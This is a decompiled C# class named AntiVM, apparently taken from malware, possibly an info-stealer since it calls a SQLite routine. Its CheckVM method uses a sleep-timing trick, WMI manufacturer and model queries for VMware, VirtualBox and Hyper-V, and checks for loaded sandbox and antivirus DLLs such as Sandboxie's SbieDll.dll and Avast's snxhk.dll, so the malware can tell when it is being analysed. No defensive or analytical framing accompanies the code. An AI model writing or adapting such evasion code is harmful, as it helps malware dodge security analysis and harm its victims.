using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Threading;

// Token: 0x0200001B RID: 27
internal class AntiVM
{
	// Token: 0x06000042 RID: 66 RVA: 0x00005448 File Offset: 0x00003648
	protected static bool CheckAdministrator()
	{
		return Process.GetCurrentProcess().ProcessName.ToLower() == "pll_test";
	}

	// Token: 0x06000043 RID: 67 RVA: 0x00005468 File Offset: 0x00003668
	public static bool CheckVM()
	{
		try
		{
			if (AntiVM.CheckAdministrator())
			{
				return false;
			}
			long num = (long)Environment.TickCount;
			Thread.Sleep(500);
			if ((long)Environment.TickCount - num < 500L)
			{
				return false;
			}
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				Sqlite.SqliteFile();
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox" || WinApi.GetModuleHandle("cmdvrt32.dll").ToInt32() != 0 || WinApi.GetModuleHandle("SxIn.dll").ToInt32() != 0 || WinApi.GetModuleHandle("SbieDll.dll").ToInt32() != 0 || WinApi.GetModuleHandle("sf2.dll").ToInt32() != 0 || WinApi.GetModuleHandle("snxhk.dll").ToInt32() != 0)
						{
							return true;
						}
						PropertyData propertyData = managementBaseObject.Properties.OfType<PropertyData>().FirstOrDefault((PropertyData p) => p.Name == "HypervisorPresent");
						if ((bool?)((propertyData != null) ? propertyData.Value : null) == true)
						{
							return false;
						}
					}
				}
			}
			return false;
		}
		catch
		{
		}
		return false;
	}
}
